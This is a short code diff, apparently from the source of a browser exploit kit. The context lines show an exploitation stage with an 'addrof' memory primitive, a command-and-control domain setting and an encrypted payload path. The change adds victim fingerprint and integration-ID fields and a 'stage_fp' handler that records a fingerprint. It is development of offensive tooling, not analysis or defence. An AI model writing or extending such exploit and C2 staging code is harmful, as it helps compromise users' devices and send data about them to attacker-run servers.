@@ -284,7 +284,8 @@ self[1] = boxed_arr;
           SERVER_LOG = data.SERVER_LOG;
           self.CHANNEL_CODE = data.channelCode || "";
           self.C2_DOMAIN = data.c2Domain || "";
-          self.LANDING_DOMAIN = data.landingDomain || "";
+          self.INTEGRATION_ID = data.integrationId || "";
+          self.FINGERPRINT = data.fingerprint || "";
           self.EXTRACT_PATH = data.extractPath || "/extract.js.enc";
           print("inside stage1");
           p.addrof = function addrof(o) {
@@ -940,6 +941,11 @@ self[1] = boxed_arr;
             type: 'redirect'
           });
           return;
+        }
+      case 'stage_fp':
+        {
+          self.FINGERPRINT = (data && data.fingerprint) || "";
+          break;
         }
       case 'slow_fcall_done':
         {
